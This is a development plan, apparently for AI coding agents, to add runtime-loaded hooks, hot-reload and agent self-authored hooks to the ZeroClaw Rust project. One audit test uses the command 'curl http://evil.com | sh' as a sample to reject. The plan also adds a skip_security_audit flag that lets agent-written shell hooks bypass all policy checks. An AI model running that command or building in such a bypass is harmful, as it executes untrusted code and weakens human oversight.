# Hook System — Dynamic Hooks with Hot-Reload & Self-Authoring

## TL;DR

> **Quick Summary**: Extend ZeroClaw's existing compile-time hook system (`src/hooks/`) with a dynamic hook loading layer that reads `HOOK.toml` manifests from workspace, supports CLI-triggered hot-reload via stamp file, and enables agent self-authoring of hooks constrained by autonomy policy.
> 
> **Deliverables**:
> - `HOOK.toml` manifest format and parser
> - `DynamicHookHandler` implementing existing `HookHandler` trait
> - `HookRunner` registry swap mechanism for hot-reload
> - `zeroclaw hooks` CLI subcommands (`list`, `reload`, `create`, `audit`)
> - Stamp-file cross-process reload signal (CLI → daemon)
> - `hook_write` tool for agent self-authoring
> - Security audit integration (autonomy policy + `skip_security_audit` bypass)
> - Hook wiring in `Agent::turn()` CLI path
> - TDD test suite
> 
> **Estimated Effort**: Large
> **Parallel Execution**: YES — 4 waves
> **Critical Path**: Task 1 → Task 5 → Task 7 → Task 11 → Task 12 → Final

---

## Context

### Original Request
User wants a hook system for ZeroClaw that supports hot-reload and agent self-authoring. Not aiming for full OpenClaw plugin compatibility — just the hook lifecycle mechanism.

### Interview Summary
**Key Discussions**:
- ZeroClaw already has `src/hooks/` with `HookHandler` trait (9 void + 6 modifying hooks), `HookRunner` with priority/panic-safety/cancel — but compile-time only
- Hook format: Pure TOML manifest (`HOOK.toml`), no Markdown variant
- Hot-reload: CLI command `zeroclaw hooks reload` writes stamp file; daemon detects stamp on next message event and reloads
- Self-authoring security: Constrained by `autonomy.*` policy; `skip_security_audit` flag bypasses autonomy constraints
- Test strategy: TDD (Red-Green-Refactor)

**Research Findings**:
- Config hot-reload uses stamp-based polling in `channels/mod.rs:614-682`
- SkillForge has Scout→Evaluate→Integrate pipeline for self-authoring
- Skills audit (`src/skills/audit.rs`) blocks symlinks, dangerous scripts, shell chaining
- `Agent::turn()` in `agent.rs` does NOT wire hooks — needs to be added
- CLI and daemon are separate processes — cross-process reload via stamp file

### Metis Review
**Identified Gaps** (addressed):
- Cross-process reload: resolved via stamp-file pattern from `channels/mod.rs`
- `Agent::turn()` missing hooks — added as explicit task
- HOOK.toml action types: `shell`, `http`, `prompt_inject`
- Hook execution timeout needed — added to HOOK.toml schema
- Malformed HOOK.toml — fail-open (skip bad hook, log warning)
- Hook ordering conflicts — priority field, ties broken by alphabetical name

---

## Work Objectives

### Core Objective
Add a dynamic hook loading layer on top of ZeroClaw's existing `HookHandler` trait system, enabling runtime-defined hooks via `HOOK.toml` files with CLI-triggered hot-reload and agent self-authoring.

### Concrete Deliverables
- `src/hooks/manifest.rs` — HOOK.toml parser and schema types
- `src/hooks/dynamic.rs` — `DynamicHookHandler` implementing `HookHandler`
- `src/hooks/loader.rs` — Hook directory scanner and loader
- `src/hooks/reload.rs` — Stamp-file reload signal mechanism
- `src/hooks/audit.rs` — Hook-specific security audit
- CLI subcommands: `zeroclaw hooks list|reload|create|audit`
- `src/tools/hook_write.rs` — Agent self-authoring tool
- Config schema additions: `[hooks]` section
- Hook wiring in `Agent::turn()` path

### Definition of Done
- [ ] `cargo test` passes with new hook tests
- [ ] `cargo clippy --all-targets -- -D warnings` clean
- [ ] `cargo fmt --all -- --check` clean
- [ ] Dynamic hooks load from `~/.zeroclaw/workspace/hooks/<name>/HOOK.toml`
- [ ] `zeroclaw hooks reload` triggers daemon reload via stamp file
- [ ] Agent can create hooks via `hook_write` tool, constrained by autonomy policy
- [ ] Existing compile-time hooks continue to work unchanged

### Must Have
- HOOK.toml manifest format with event binding, priority, conditions, action
- `DynamicHookHandler` implementing all existing `HookHandler` trait methods
- CLI `zeroclaw hooks reload` with stamp-file cross-process signal
- Hot-reload detection in channel message loop (stamp polling)
- `hook_write` tool for agent self-authoring
- Security audit enforcing autonomy policy on hook shell commands
- `skip_security_audit` config flag to bypass autonomy constraints
- Hook wiring in `Agent::turn()` CLI agent path
- TDD test coverage for parser, loader, runner integration, security audit

### Must NOT Have (Guardrails)
- No `notify` crate or filesystem watchers — stamp-based polling only
- No WASM or subprocess hook execution — hooks run in-process
- No hook marketplace or remote registry
- No hook versioning or dependency resolution
- No changes to existing `HookHandler` trait signature — extend, don't modify
- No OpenClaw plugin format compatibility
- No prompt-based HOOK.md format — TOML only
- No unbounded hook execution — all shell/http actions must have timeout
- No hook that can bypass security without explicit `skip_security_audit` flag

---

## Verification Strategy

> **ZERO HUMAN INTERVENTION** — ALL verification is agent-executed.

### Test Decision
- **Infrastructure exists**: YES (`cargo test`)
- **Automated tests**: TDD (Red-Green-Refactor)
- **Framework**: `cargo test` (standard Rust)
- **Each task**: RED (failing test) → GREEN (minimal impl) → REFACTOR

### QA Policy
Every task MUST include agent-executed QA scenarios.
Evidence saved to `.sisyphus/evidence/task-{N}-{scenario-slug}.{ext}`.

---

## Execution Strategy

### Parallel Execution Waves

```
Wave 1 (Foundation):
├── Task 1: HOOK.toml manifest schema + parser [quick]
├── Task 2: Config schema additions ([hooks] section) [quick]
├── Task 3: Hook security audit module [deep]
└── Task 4: CLI subcommand scaffolding [quick]

Wave 2 (Core):
├── Task 5: Hook directory loader + DynamicHookHandler [deep]
├── Task 6: Stamp-file reload signal mechanism [quick]
├── Task 7: HookRunner registry swap (Arc<RwLock>) [deep]
└── Task 8: Hook wiring in Agent::turn() CLI path [unspecified-high]

Wave 3 (Integration):
├── Task 9: CLI hooks subcommands implementation [unspecified-high]
├── Task 10: hook_write tool for agent self-authoring [deep]
├── Task 11: Hot-reload stamp detection in channel loop [unspecified-high]
└── Task 12: Integration tests — full lifecycle [deep]

Wave FINAL (Verification):
├── F1: Plan compliance audit (oracle)
├── F2: Code quality review (unspecified-high)
├── F3: Real manual QA (unspecified-high)
└── F4: Scope fidelity check (deep)

Critical Path: T1 → T5 → T7 → T11 → T12 → Final
Max Concurrent: 4
```

### Dependency Matrix

| Task | Depends On | Blocks | Wave |
|------|-----------|--------|------|
| 1 | — | 5, 9, 10 | 1 |
| 2 | — | 5, 9 | 1 |
| 3 | — | 5, 10 | 1 |
| 4 | — | 9 | 1 |
| 5 | 1, 2, 3 | 7, 8, 10, 11 | 2 |
| 6 | — | 9, 11 | 2 |
| 7 | 5 | 8, 11 | 2 |
| 8 | 5, 7 | 12 | 2 |
| 9 | 1, 4, 5, 6 | 12 | 3 |
| 10 | 1, 3, 5 | 12 | 3 |
| 11 | 5, 6, 7 | 12 | 3 |
| 12 | 8, 9, 10, 11 | Final | 3 |

### Agent Dispatch Summary
- **Wave 1**: T1 `quick`, T2 `quick`, T3 `deep`, T4 `quick`
- **Wave 2**: T5 `deep`, T6 `quick`, T7 `deep`, T8 `unspecified-high`
- **Wave 3**: T9 `unspecified-high`, T10 `deep`, T11 `unspecified-high`, T12 `deep`
- **Final**: F1 `oracle`, F2 `unspecified-high`, F3 `unspecified-high`, F4 `deep`

---

## TODOs

- [ ] 1. HOOK.toml Manifest Schema + Parser

  **What to do**:
  - RED: Write tests for HOOK.toml parsing — valid manifest, missing fields, invalid event names, malformed TOML
  - GREEN: Define `HookManifest` struct in `src/hooks/manifest.rs` with fields: `name`, `description`, `version`, `event` (enum matching HookHandler methods), `priority` (i32, default 0), `enabled` (bool, default true), `conditions` (optional filter: channel, user, pattern), `action` (enum: Shell { command, timeout_secs, workdir }, Http { url, method, headers, body, timeout_secs }, PromptInject { content, position }), `skip_security_audit` (bool, default false)
  - GREEN: Implement `HookManifest::from_toml(content: &str) -> Result<Self>` using `toml` crate
  - GREEN: Implement `HookManifest::validate() -> Result<()>` — verify event name is valid, timeout > 0, action fields present
  - REFACTOR: Extract event name validation into shared enum with `HookHandler` trait methods

  **Must NOT do**: Do not modify existing `HookHandler` trait; do not implement hook execution — only parsing and validation

  **Agent**: `quick`, Skills: []
  **Parallelization**: Wave 1, Blocks: 5,9,10. Blocked By: None

  **References**:
  - `src/hooks/traits.rs:25-79` — HookHandler trait method names (event enum must match these)
  - `src/skills/mod.rs:48-68` — SKILL.toml parsing pattern to follow
  - `src/config/schema.rs` — serde derive patterns used in this codebase

  **Acceptance Criteria**:
  - [ ] `src/hooks/manifest.rs` created with `HookManifest` struct
  - [ ] `cargo test hooks::manifest` → PASS (≥8 tests)

  **QA Scenarios:**
  ```
  Scenario: Parse valid HOOK.toml with shell action
    Tool: Bash (cargo test)
    Steps:
      1. Call HookManifest::from_toml() with valid TOML containing event="before_tool_call", priority=10, action.shell.command="echo test"
      2. Assert parsed manifest has correct event, priority, action variant
      3. Call validate() and assert Ok(())
    Expected Result: All fields parsed correctly, validation passes
    Evidence: .sisyphus/evidence/task-1-parse-valid.txt

  Scenario: Reject HOOK.toml with invalid event name
    Tool: Bash (cargo test)
    Steps:
      1. Call HookManifest::from_toml() with event="nonexistent_hook"
      2. Call validate() — should return Err
    Expected Result: Err containing "unknown hook event"
    Evidence: .sisyphus/evidence/task-1-invalid-event.txt
  ```

  **Commit**: YES
  - Message: `feat(hooks): add HOOK.toml manifest schema and parser`
  - Files: `src/hooks/manifest.rs`
  - Pre-commit: `cargo test hooks::manifest`

- [ ] 2. Config Schema Additions — [hooks] Section

  **What to do**:
  - RED: Write test for config deserialization with new `[hooks]` fields
  - GREEN: Extend existing `HooksConfig` struct in `src/config/schema.rs` (currently at line ~1898 with `enabled` and `builtin` fields) — add: `hooks_dir` (Option<PathBuf>), `skip_security_audit` (bool, default false), `max_hooks` (usize, default 50), `default_timeout_secs` (u64, default 30)
  - REFACTOR: Ensure backward compatibility — missing fields use defaults

  **Must NOT do**: Do not add hot-reload fields — stamp file handles that

  **Agent**: `quick`, Skills: []
  **Parallelization**: Wave 1, Blocks: 5,9. Blocked By: None

  **References**:
  - `src/config/schema.rs:~1898` — Existing HooksConfig struct to extend
  - `src/config/schema.rs:584-604` — serde default function pattern

  **Acceptance Criteria**:
  - [ ] `HooksConfig` extended with new fields
  - [ ] `cargo test config` → PASS
  - [ ] Config without new fields still parses (backward compatible)

  **QA Scenarios:**
  ```
  Scenario: Config with new [hooks] fields parses correctly
    Tool: Bash (cargo test)
    Steps: Deserialize config with [hooks] skip_security_audit=true, max_hooks=20. Assert fields match.
    Expected Result: All fields parsed correctly
    Evidence: .sisyphus/evidence/task-2-config-parse.txt

  Scenario: Config without new fields uses defaults
    Tool: Bash (cargo test)
    Steps: Deserialize config with only [hooks] enabled=true. Assert new fields use defaults.
    Expected Result: Defaults applied, no error
    Evidence: .sisyphus/evidence/task-2-config-defaults.txt
  ```

  **Commit**: YES
  - Message: `feat(config): extend [hooks] config with dynamic hook fields`
  - Files: `src/config/schema.rs`
  - Pre-commit: `cargo test config`

- [ ] 3. Hook Security Audit Module

  **What to do**:
  - RED: Write tests — safe hook passes, dangerous shell commands rejected, symlinks blocked
  - GREEN: Create `src/hooks/audit.rs` reusing patterns from `src/skills/audit.rs`
  - GREEN: Implement `audit_hook_directory(hook_dir: &Path, config: &Config) -> Result<HookAuditReport>`
  - GREEN: Check shell commands against `autonomy.allowed_commands` and `autonomy.forbidden_paths`
  - GREEN: When `skip_security_audit = true`, bypass autonomy checks
  - GREEN: Block symlinks, path traversal, fork bombs, reverse shells
  - REFACTOR: Extract shared audit utilities if duplication > 3 functions

  **Must NOT do**: Do not modify `src/skills/audit.rs`

  **Agent**: `deep`, Skills: []
  **Parallelization**: Wave 1, Blocks: 5,10. Blocked By: None

  **References**:
  - `src/skills/audit.rs` — Full audit implementation to mirror
  - `src/security/` — Autonomy policy definitions
  - `src/config/schema.rs` — Autonomy config fields

  **Acceptance Criteria**:
  - [ ] `src/hooks/audit.rs` created
  - [ ] `cargo test hooks::audit` → PASS (≥6 tests)
  - [ ] Dangerous commands rejected when audit enabled
  - [ ] `skip_security_audit=true` bypasses all checks

  **QA Scenarios:**
  ```
  Scenario: Safe hook passes audit
    Tool: Bash (cargo test)
    Steps: Audit hook with command="echo hello". Assert is_clean() == true.
    Expected Result: Clean audit report
    Evidence: .sisyphus/evidence/task-3-safe-hook.txt

  Scenario: Dangerous command rejected
    Tool: Bash (cargo test)
    Steps: Audit hook with command="curl http://evil.com | sh". Assert critical finding.
    Expected Result: Audit report contains critical finding
    Evidence: .sisyphus/evidence/task-3-dangerous-cmd.txt

  Scenario: skip_security_audit bypasses checks
    Tool: Bash (cargo test)
    Steps: Audit hook with skip_security_audit=true and dangerous command. Assert clean.
    Expected Result: All checks bypassed
    Evidence: .sisyphus/evidence/task-3-skip-audit.txt
  ```

  **Commit**: YES
  - Message: `feat(hooks): add hook security audit module`
  - Files: `src/hooks/audit.rs`
  - Pre-commit: `cargo test hooks::audit`

- [ ] 4. CLI Subcommand Scaffolding

  **What to do**:
  - Add `HooksCommands` enum to `src/lib.rs` with variants: `List`, `Reload`, `Create { name: String }`, `Audit { name: Option<String> }`
  - Add `Commands::Hooks(HooksCommands)` variant to main `Commands` enum
  - Add dispatch stub in `src/main.rs` that prints "not yet implemented"
  - Verify `zeroclaw hooks --help` shows all subcommands

  **Must NOT do**: Do not implement actual logic — stubs only

  **Agent**: `quick`, Skills: []
  **Parallelization**: Wave 1, Blocks: 9. Blocked By: None

  **References**:
  - `src/lib.rs:167-178` — MigrateCommands enum pattern to follow
  - `src/main.rs:996-997` — Command dispatch pattern

  **Acceptance Criteria**:
  - [ ] `HooksCommands` enum in `src/lib.rs`
  - [ ] `zeroclaw hooks list` runs without panic
  - [ ] `cargo build` succeeds

  **QA Scenarios:**
  ```
  Scenario: CLI hooks subcommands accessible
    Tool: Bash
    Steps: Run `cargo run -- hooks --help`. Assert output contains "list", "reload", "create", "audit".
    Expected Result: All 4 subcommands listed
    Evidence: .sisyphus/evidence/task-4-cli-help.txt
  ```

  **Commit**: YES
  - Message: `feat(cli): scaffold hooks subcommands`
  - Files: `src/lib.rs`, `src/main.rs`
  - Pre-commit: `cargo build`

- [ ] 5. Hook Directory Loader + DynamicHookHandler

  **What to do**:
  - RED: Write tests for loading hooks from `hooks/<name>/HOOK.toml` directory structure
  - GREEN: Create `src/hooks/loader.rs` with `load_hooks_from_dir(hooks_dir: &Path, config: &HooksConfig) -> Result<Vec<LoadedHook>>`
  - GREEN: Scanner walks `hooks/*/HOOK.toml`, parses each, runs security audit, skips invalid (log warning)
  - GREEN: Create `src/hooks/dynamic.rs` with `DynamicHookHandler` struct holding `Vec<LoadedHook>`
  - GREEN: Implement `HookHandler` trait for `DynamicHookHandler` — each method checks loaded hooks for matching event, executes action (shell via `tokio::process::Command`, http via `reqwest`, prompt_inject returns modified string)
  - GREEN: For modifying hooks: return `HookResult::Continue(modified)` or `HookResult::Cancel(reason)`
  - GREEN: For void hooks: spawn action as fire-and-forget task
  - GREEN: Enforce timeout from HOOK.toml (or config default) on all shell/http actions
  - GREEN: Evaluate conditions (channel, user, pattern regex) before executing
  - REFACTOR: Extract action executor into `src/hooks/executor.rs` if >150 lines

  **Must NOT do**: Do not modify `HookHandler` trait signature; do not add `notify` crate; do not implement reload logic here

  **Agent**: `deep`, Skills: []
  **Parallelization**: Wave 2, Blocks: 7,8,10,11. Blocked By: 1,2,3

  **References**:
  - `src/hooks/traits.rs:25-79` — HookHandler trait (implement ALL methods)
  - `src/hooks/runner.rs:19-314` — HookRunner dispatch model
  - `src/skills/mod.rs` — Skill directory loading pattern to mirror
  - `src/hooks/manifest.rs` (Task 1) — HookManifest struct
  - `src/hooks/audit.rs` (Task 3) — Security audit integration

  **Acceptance Criteria**:
  - [ ] `src/hooks/loader.rs` and `src/hooks/dynamic.rs` created
  - [ ] `cargo test hooks::loader` → PASS (≥6 tests)
  - [ ] `cargo test hooks::dynamic` → PASS (≥8 tests)
  - [ ] DynamicHookHandler correctly dispatches shell actions with timeout

  **QA Scenarios:**
  ```
  Scenario: Load hooks from workspace directory
    Tool: Bash (cargo test)
    Steps: Create temp dir with hooks/my-hook/HOOK.toml. Call load_hooks_from_dir(). Assert 1 hook loaded.
    Expected Result: Hook loaded and parsed correctly
    Evidence: .sisyphus/evidence/task-5-load-hooks.txt

  Scenario: DynamicHookHandler fires shell action on matching event
    Tool: Bash (cargo test)
    Steps: Create DynamicHookHandler with hook bound to on_session_start. Call on_session_start(). Assert shell command executed.
    Expected Result: Shell command executed
    Evidence: .sisyphus/evidence/task-5-fire-shell.txt

  Scenario: Malformed HOOK.toml skipped with warning
    Tool: Bash (cargo test)
    Steps: Create dir with invalid HOOK.toml. Call load_hooks_from_dir(). Assert 0 hooks loaded, no panic.
    Expected Result: Empty result, warning logged
    Evidence: .sisyphus/evidence/task-5-malformed-skip.txt
  ```

  **Commit**: YES
  - Message: `feat(hooks): implement dynamic hook loader and DynamicHookHandler`
  - Files: `src/hooks/loader.rs`, `src/hooks/dynamic.rs`
  - Pre-commit: `cargo test hooks`

- [ ] 6. Stamp-File Reload Signal Mechanism

  **What to do**:
  - RED: Write tests for stamp file creation and detection
  - GREEN: Create `src/hooks/reload.rs` with `write_reload_stamp(workspace_dir: &Path) -> Result<()>` — writes current timestamp to `~/.zeroclaw/workspace/.hooks-reload-stamp`
  - GREEN: Implement `check_reload_stamp(workspace_dir: &Path, last_stamp: &mut Option<u64>) -> bool` — returns true if stamp changed
  - REFACTOR: Align naming with config stamp pattern in `channels/mod.rs`

  **Must NOT do**: No file watchers, no `notify` crate

  **Agent**: `quick`, Skills: []
  **Parallelization**: Wave 2, Blocks: 9,11. Blocked By: None

  **References**:
  - `src/channels/mod.rs:614-682` — Config stamp polling pattern to mirror

  **Acceptance Criteria**:
  - [ ] `src/hooks/reload.rs` created
  - [ ] `cargo test hooks::reload` → PASS (≥4 tests)

  **QA Scenarios:**
  ```
  Scenario: Write and detect stamp file
    Tool: Bash (cargo test)
    Steps: Call write_reload_stamp(). Call check_reload_stamp() with None. Assert true. Call again. Assert false.
    Expected Result: First check true, second false
    Evidence: .sisyphus/evidence/task-6-stamp-detect.txt
  ```

  **Commit**: YES
  - Message: `feat(hooks): add stamp-file reload signal`
  - Files: `src/hooks/reload.rs`
  - Pre-commit: `cargo test hooks::reload`

- [ ] 7. HookRunner Registry Swap for Hot-Reload

  **What to do**:
  - RED: Write tests for atomic handler swap — old handlers replaced, new active, no data race
  - GREEN: Modify `src/hooks/runner.rs` to wrap handler storage in `Arc<RwLock<Vec<Box<dyn HookHandler>>>>`
  - GREEN: Add `HookRunner::reload_dynamic_hooks(hooks: Vec<Box<dyn HookHandler>>)` that swaps dynamic handlers while preserving compile-time handlers
  - GREEN: Separate internal storage into `static_handlers` (compile-time, never swapped) and `dynamic_handlers` (from HOOK.toml, swappable)
  - GREEN: All dispatch methods read from both handler lists, sorted by priority
  - REFACTOR: Ensure `RwLock` read path is non-blocking for normal dispatch

  **Must NOT do**: Do not break existing compile-time hook registration; do not use `Mutex` — use `RwLock`

  **Agent**: `deep`, Skills: []
  **Parallelization**: Wave 2, Blocks: 8,11. Blocked By: 5

  **References**:
  - `src/hooks/runner.rs:19-314` — Current HookRunner implementation (modify in-place)
  - `src/hooks/traits.rs` — HookHandler trait (Send + Sync bounds)

  **Acceptance Criteria**:
  - [ ] `HookRunner` supports `reload_dynamic_hooks()` method
  - [ ] `cargo test hooks::runner` → PASS (existing + new tests)
  - [ ] Compile-time hooks unaffected by reload

  **QA Scenarios:**
  ```
  Scenario: Reload swaps dynamic handlers atomically
    Tool: Bash (cargo test)
    Steps: Register static + dynamic handler. Call reload_dynamic_hooks() with new handler. Fire event. Assert new dynamic + static fire, old dynamic does not.
    Expected Result: Only new dynamic + static handlers fire
    Evidence: .sisyphus/evidence/task-7-reload-swap.txt
  ```

  **Commit**: YES
  - Message: `feat(hooks): make HookRunner support runtime registry swap`
  - Files: `src/hooks/runner.rs`
  - Pre-commit: `cargo test hooks::runner`

- [ ] 8. Hook Wiring in `Agent::turn()` CLI Path

  **What to do**:
  - Add `HookRunner` (wrapped in `Arc<HookRunner>`) as a field on the `Agent` struct
  - Wire hook calls at lifecycle points in `Agent::turn()` (line ~526):
    - `on_session_start` at turn begin
    - `before_prompt_build` before building prompt
    - `before_llm_call` before calling provider
    - `on_llm_output` after receiving response
    - `on_session_end` at turn end
  - Wire hook calls in `Agent::execute_tool_call()` (line ~462):
    - `before_tool_call` before execution (respect `HookResult::Cancel`)
    - `on_after_tool_call` after execution
  - RED: Write tests that assert hook methods are called at correct lifecycle points (mock HookHandler)
  - GREEN: Wire the calls, pass correct context structs
  - REFACTOR: Ensure hook failures don't crash the agent loop (log + continue for void hooks, log + skip for cancelled modifying hooks)

  **Must NOT do**: Do not change `HookHandler` trait signatures; do not make hook failures fatal; do not add hooks to non-CLI paths (gateway has its own wiring in channels/mod.rs)

  **Agent**: `unspecified-high`, Skills: []
  **Parallelization**: Wave 2, Blocks: 12. Blocked By: 5, 7

  **References**:
  - `src/agent/agent.rs:462` — `execute_tool_call()` method (tool lifecycle hook points)
  - `src/agent/agent.rs:526` — `turn()` method (session/prompt/LLM lifecycle hook points)
  - `src/agent/loop_.rs` — Main agent loop with existing hook injection context
  - `src/hooks/runner.rs:19-314` — HookRunner dispatch methods to call
  - `src/hooks/traits.rs:25-79` — HookHandler trait (void vs modifying hook signatures)
  - `src/channels/mod.rs:200-250` — Example of hook wiring in channel path (pattern to mirror)

  **WHY Each Reference Matters**:
  - `agent.rs:turn()` is where session lifecycle hooks fire — executor must identify exact insertion points
  - `agent.rs:execute_tool_call()` is where tool lifecycle hooks fire — must handle Cancel result
  - `loop_.rs` shows the broader loop context so executor understands control flow
  - `runner.rs` shows which dispatch methods exist and their signatures
  - `channels/mod.rs` shows how hooks are already wired in the gateway path — mirror this pattern

  **Acceptance Criteria**:
  - [ ] `Agent` struct has `hook_runner: Arc<HookRunner>` field
  - [ ] `cargo test agent` → PASS (existing + new hook-wiring tests)
  - [ ] Hook failures logged but do not crash agent loop

  **QA Scenarios:**
  ```
  Scenario: Hooks fire at correct lifecycle points in turn()
    Tool: Bash (cargo test)
    Steps:
      1. Create mock HookHandler that records which methods were called
      2. Register mock in HookRunner, inject into Agent
      3. Call agent.turn() with a simple prompt
      4. Assert on_session_start, before_prompt_build, before_llm_call, on_llm_output, on_session_end all recorded in order
    Expected Result: All 5 lifecycle hooks fire in correct order
    Evidence: .sisyphus/evidence/task-8-turn-lifecycle.txt

  Scenario: before_tool_call Cancel prevents tool execution
    Tool: Bash (cargo test)
    Steps:
      1. Create mock HookHandler that returns HookResult::Cancel on before_tool_call
      2. Call agent.execute_tool_call()
      3. Assert tool was NOT executed
      4. Assert on_after_tool_call was NOT called
    Expected Result: Tool execution skipped, cancel logged
    Evidence: .sisyphus/evidence/task-8-tool-cancel.txt

  Scenario: Hook panic does not crash agent loop
    Tool: Bash (cargo test)
    Steps:
      1. Create mock HookHandler that panics in on_llm_output
      2. Call agent.turn()
      3. Assert turn completes successfully despite panic
    Expected Result: Panic caught, logged, turn continues
    Evidence: .sisyphus/evidence/task-8-hook-panic-safety.txt
  ```

  **Commit**: YES
  - Message: `feat(agent): wire HookRunner into Agent::turn() and execute_tool_call()`
  - Files: `src/agent/agent.rs`, `src/agent/loop_.rs`
  - Pre-commit: `cargo test agent`

- [ ] 9. CLI `hooks` Subcommands Implementation

  **What to do**:
  - Add `HooksCommands` enum to `src/lib.rs` (mirror `MigrateCommands` pattern at line 167-178):
    - `List` — list all installed hooks (builtin + dynamic) with status
    - `Reload` — write stamp file to trigger hot-reload
    - `Create { name, hook_type }` — scaffold a new hook directory with HOOK.toml template
    - `Audit { path }` — run security audit on a hook directory
  - Add command dispatch in `src/main.rs` (mirror migration dispatch at line 996-997)
  - `List`: scan hooks directory, parse each HOOK.toml, print table (name, version, hooks, enabled)
  - `Reload`: write timestamp to `{data_dir}/hooks_reload.stamp`, print confirmation
  - `Create`: create `{hooks_dir}/{name}/HOOK.toml` with scaffold, create empty script file
  - `Audit`: call security audit function from Task 5, print results
  - RED: Test each subcommand's core logic (list parsing, stamp writing, scaffold creation, audit invocation)
  - GREEN: Implement subcommands
  - REFACTOR: Extract shared hook directory scanning into utility function

  **Must NOT do**: Do not implement the daemon-side reload detection here (that's Task 11); do not add interactive prompts; do not auto-reload after create

  **Agent**: `unspecified-high`, Skills: []
  **Parallelization**: Wave 3, Blocks: 12. Blocked By: 1, 4, 5, 6

  **References**:
  - `src/lib.rs:167-178` — `MigrateCommands` enum pattern (mirror for `HooksCommands`)
  - `src/main.rs:996-997` — Migration command dispatch (mirror for hooks dispatch)
  - `src/config/schema.rs:~1898` — `HooksConfig` for hooks directory path
  - `src/skills/mod.rs` — Skill loading/listing pattern (similar directory scan + TOML parse)
  - `src/skills/audit.rs` — Security audit function to call from `Audit` subcommand

  **WHY Each Reference Matters**:
  - `lib.rs` MigrateCommands shows exact enum + clap derive pattern for CLI subcommands
  - `main.rs` dispatch shows how to wire new commands into the CLI router
  - `schema.rs` HooksConfig tells executor where hooks directory is configured
  - `skills/mod.rs` shows the directory-scan + TOML-parse pattern to mirror for hook listing
  - `skills/audit.rs` is the audit function to invoke from the CLI audit subcommand

  **Acceptance Criteria**:
  - [ ] `zeroclaw hooks list` prints table of installed hooks
  - [ ] `zeroclaw hooks reload` writes stamp file and prints confirmation
  - [ ] `zeroclaw hooks create my-hook` scaffolds HOOK.toml
  - [ ] `zeroclaw hooks audit ./hooks/my-hook` runs security audit
  - [ ] `cargo test` → all new CLI tests PASS

  **QA Scenarios:**
  ```
  Scenario: hooks list shows builtin and dynamic hooks
    Tool: Bash (cargo run)
    Steps:
      1. Create a test hook directory with valid HOOK.toml
      2. Run `cargo run -- hooks list`
      3. Assert output contains hook name, version, hook points, enabled status
    Expected Result: Table with at least the test hook listed
    Evidence: .sisyphus/evidence/task-9-hooks-list.txt

  Scenario: hooks create scaffolds valid HOOK.toml
    Tool: Bash (cargo run)
    Steps:
      1. Run `cargo run -- hooks create test-hook`
      2. Assert directory `{hooks_dir}/test-hook/` exists
      3. Assert `HOOK.toml` contains [hook] section with name = "test-hook"
      4. Parse HOOK.toml with toml crate — assert no parse errors
    Expected Result: Valid scaffold created
    Evidence: .sisyphus/evidence/task-9-hooks-create.txt

  Scenario: hooks reload writes stamp file
    Tool: Bash (cargo run)
    Steps:
      1. Run `cargo run -- hooks reload`
      2. Assert stamp file exists at expected path
      3. Assert stamp file contains valid timestamp
    Expected Result: Stamp file written, confirmation printed
    Evidence: .sisyphus/evidence/task-9-hooks-reload.txt

  Scenario: hooks audit catches dangerous patterns
    Tool: Bash (cargo run)
    Steps:
      1. Create hook with script containing shell chaining (`&&`, `|`)
      2. Run `cargo run -- hooks audit ./test-hook`
      3. Assert output contains security warning
    Expected Result: Audit flags dangerous patterns
    Evidence: .sisyphus/evidence/task-9-hooks-audit-dangerous.txt
  ```

  **Commit**: YES
  - Message: `feat(cli): add hooks list/reload/create/audit subcommands`
  - Files: `src/lib.rs`, `src/main.rs`, `src/hooks/cli.rs`
  - Pre-commit: `cargo test`

- [ ] 10. `hook_write` Tool for Agent Self-Authoring

  **What to do**:
  - Implement `HookWriteTool` in `src/tools/hook_write.rs` implementing the `Tool` trait
  - Tool accepts: hook name, hook points to subscribe, script content, description
  - Tool generates valid HOOK.toml + script file in hooks directory
  - Security gate: check `autonomy.*` policy before writing
    - If `skip_security_audit` is enabled in config, bypass autonomy constraints
    - Otherwise, run security audit (from Task 5) on generated content before write
    - Reject if audit fails — return structured ToolResult with rejection reason
  - Register tool in `src/tools/mod.rs` tool registry
  - RED: Test autonomy policy enforcement, audit bypass, TOML generation, rejection on dangerous content
  - GREEN: Implement tool with full security gate
  - REFACTOR: Extract TOML generation into shared utility (reused by CLI create in Task 9)

  **Must NOT do**: Do not allow writing hooks outside the configured hooks directory; do not skip audit unless `skip_security_audit` is explicitly true; do not auto-reload after write (agent must call `hooks reload` separately)

  **Agent**: `deep`, Skills: []
  **Parallelization**: Wave 3, Blocks: 12. Blocked By: 1, 3, 5

  **References**:
  - `src/tools/traits.rs` — `Tool` trait definition (implement this)
  - `src/tools/mod.rs` — Tool registry (register HookWriteTool here)
  - `src/tools/memory.rs` or `src/tools/file.rs` — Example Tool implementations (pattern to follow)
  - `src/skills/audit.rs` — Security audit functions to call before write
  - `src/security/` — Autonomy policy checking (check before allowing write)
  - `src/config/schema.rs:~1898` — `HooksConfig` for hooks directory path
  - `src/skillforge/` — Scout→Evaluate→Integrate pipeline (self-authoring pattern reference)

  **WHY Each Reference Matters**:
  - `tools/traits.rs` defines the Tool trait the executor must implement
  - `tools/mod.rs` is where the new tool gets registered for agent access
  - Existing tool impls show parameter schema, ToolResult construction, error handling patterns
  - `skills/audit.rs` provides the audit function to gate writes
  - `security/` provides autonomy policy checks — executor must understand the policy model
  - `skillforge/` shows how the agent already self-authors skills — similar pattern for hooks

  **Acceptance Criteria**:
  - [ ] `HookWriteTool` registered in tool registry
  - [ ] Autonomy policy blocks write when not permitted
  - [ ] `skip_security_audit: true` bypasses autonomy check
  - [ ] Security audit rejects dangerous hook content
  - [ ] Generated HOOK.toml is valid and parseable
  - [ ] `cargo test tools::hook_write` → PASS

  **QA Scenarios:**
  ```
  Scenario: Agent writes a valid hook via tool
    Tool: Bash (cargo test)
    Steps:
      1. Configure autonomy policy to allow hook writing
      2. Call HookWriteTool with name="auto-log", hooks=["on_llm_output"], script content that logs output
      3. Assert hook directory created with valid HOOK.toml
      4. Parse generated HOOK.toml — assert name, version, hooks fields correct
    Expected Result: Valid hook created in hooks directory
    Evidence: .sisyphus/evidence/task-10-agent-write-hook.txt

  Scenario: Autonomy policy blocks unauthorized write
    Tool: Bash (cargo test)
    Steps:
      1. Configure autonomy policy to DENY hook writing
      2. Call HookWriteTool with valid hook content
      3. Assert ToolResult contains rejection reason mentioning autonomy policy
      4. Assert no files created in hooks directory
    Expected Result: Write blocked, clear error message
    Evidence: .sisyphus/evidence/task-10-autonomy-block.txt

  Scenario: skip_security_audit bypasses autonomy check
    Tool: Bash (cargo test)
    Steps:
      1. Configure autonomy policy to DENY hook writing
